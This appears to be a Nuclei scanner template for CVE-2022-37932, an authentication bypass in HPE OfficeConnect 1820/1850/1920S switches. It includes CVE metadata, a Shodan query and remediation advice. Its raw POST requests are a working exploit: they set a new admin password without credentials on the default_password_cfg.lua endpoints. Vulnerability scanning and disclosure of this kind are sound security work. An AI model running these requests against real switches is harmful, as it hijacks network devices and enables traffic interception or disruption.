flow: http(1) && (http(2) || http(3))
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, '<title>HPE OfficeConnect Switch 1920')
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- extractors:
  - internal: true
    json:
    - .redirect
    name: redirect
    part: body
    type: json
  - dsl:
    - '"Password:"+ password'
    - '"Login Path:"+ redirect'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "redirect")
    - contains(content_type, "application/json")
    type: dsl
  raw:
  - 'POST /login/default_password_cfg.lua HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=admin&oldPwd=&newPwd={{password}}&confirmPwd={{password}}

    '
- extractors:
  - internal: true
    json:
    - .redirect
    name: redirect
    part: body
    type: json
  - dsl:
    - '"Password:"+ password'
    - '"Login Path:"+ redirect'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "redirect")
    - contains(content_type, "application/json")
    type: dsl
  raw:
  - 'POST /htdocs/login/default_password_cfg.lua HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=admin&oldPwd=&newPwd={{password}}&confirmPwd={{password}}

    '
id: CVE-2022-37932
info:
  author: Phulelouch
  classification:
    cpe: cpe:2.3:o:hpe:officeconnect_1820_j9979a_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-37932
    cvss-metrics: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    epss-percentile: 0.97395
    epss-score: 0.43976
  description: 'A potential security vulnerability has been identified in Hewlett
    Packard Enterprise OfficeConnect 1820, 1850, and 1920S Network switches. The vulnerability
    could be remotely exploited to allow authentication bypass. HPE has made the following
    software updates to resolve the vulnerability in Hewlett Packard Enterprise OfficeConnect
    1820, 1850 and 1920S Network switches versions- Prior to PT.02.14; Prior to PC.01.22;
    Prior to PO.01.21; Prior to PD.02.22;

    '
  impact: 'Attackers on the adjacent network can bypass authentication on HP OfficeConnect
    switches without credentials, potentially gaining administrative access to modify
    switch configurations, intercept network traffic, or disrupt network operations.

    '
  metadata:
    max-request: 3
    product: officeconnect_1820_j9979a_firmware
    shodan-query: html:"HPE OfficeConnect"
    vendor: hpe
    verified: true
  name: HP Switch - Authentication Bypass
  remediation: 'Update to HPE OfficeConnect switch firmware version PT.02.14 or later
    for 1820 series, PC.01.22 or later for 1850 series, or PO.01.21/PD.02.22 or later
    for 1920S series.

    '
  severity: high
  tags: cve,cve2022,hp,officeconnect,auth-bypass,intrusive,vkev,vuln
variables:
  password: '{{rand_base(8)}}'
